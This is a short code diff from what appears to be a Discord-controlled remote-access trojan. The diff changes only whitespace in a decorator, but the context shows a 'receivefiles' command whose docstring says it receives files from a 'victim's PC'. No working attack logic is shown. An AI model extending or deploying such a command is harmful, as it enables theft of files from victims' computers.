@@ -10,7 +10,7 @@ class ReceiveFiles(commands.Cog):
         self.bot = bot
         self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command()
+    @commands.slash_command( )
     async def receivefiles(self, ctx, victim, file_path):
         """Receives file from victim's PC.
 
